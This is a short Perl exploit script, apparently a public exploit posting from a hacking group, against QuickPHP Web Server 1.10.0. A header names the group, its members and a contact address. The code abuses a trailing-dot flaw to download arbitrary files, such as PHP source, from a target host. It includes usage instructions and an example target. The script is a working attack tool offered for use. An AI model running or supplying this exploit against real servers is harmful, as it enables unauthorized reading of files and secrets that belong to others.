#     _             ____  __            __    ___ 
#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / / 
# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/  
#                   Live by the byte     |_/_/  
#
# Members:
#
# Pr0T3cT10n
# -=M.o.B.=-
# TheLeader
# Sro
# Debug
#
# Contact: inv0ked.israel@gmail.com
#
# -----------------------------------
# QuickPHP Web Server is vulnerable for a Remote File Download attcak, the following code will exploit the bug.
# The vulnerability allows an unprivileged attacker to download files whom he has no permissions to.
# -----------------------------------
# Vulnerability Title: QuickPHP Web Server 1.10.0 Remote File Download Exploit
# Date: 30/12/2010
# Author: Pr0T3cT10n
# Software Link: http://www.zachsaw.co.cc/downloads/quickphp_webserver.zip
# Affected Version: 1.10.0
# Tested on Windows XP Hebrew, Service Pack 3
# ISRAEL, NULLBYTE.ORG.IL
###
 
#!/usr/bin/perl
use LWP::Simple;
 
if (@ARGV < 3) {
    print("\r\n");
    print("QuickPHP Web Server 1.10.0 Remote File Download Exploit\r\n");
    print("Discovered & Exploited by Pr0T3cT10n\r\n");
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n");
    print("Usage: " .$0. " <host> <port> <file>\r\n");
    print("HOST - An host using QuickPHP Web Server\r\n");
    print("PORT - Port number\r\n");
    print("FILE - The file you want to get\r\n");
    print("Example: " .$0. " hostingserver.com 80 index.php\r\n\r\n");
    exit(1);
} else {
    print("QuickPHP Web Server 1.10.0 Remote File Download Exploit\r\n");
    print("Discovered & Exploited by Pr0T3cT10n\r\n");
    print("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n\r\n");
    ($host, $port, $file) = @ARGV;
    $content = get("http://" .$host. ":" .$port. "/" .$file. ".");
        print("File Content:\r\n\r\n");
    print($content. "\r\n");
}